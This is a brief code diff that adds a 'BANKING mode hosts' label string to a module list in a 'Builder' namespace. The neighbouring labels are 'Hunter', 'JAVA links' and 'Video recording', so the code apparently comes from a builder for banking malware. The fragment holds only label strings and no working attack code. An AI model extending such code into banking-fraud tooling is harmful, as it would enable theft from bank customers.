@@ -44,6 +44,7 @@ namespace Builder
 }
 
 
+PCHAR Module_BankHosts     = "Хосты режима BANKING";
 PCHAR Module_Hunter        = "Hunter";
 PCHAR Module_JavaConfig    = "Ссылки JAVA";
 PCHAR Module_VideoRecorder = "Запись видео";
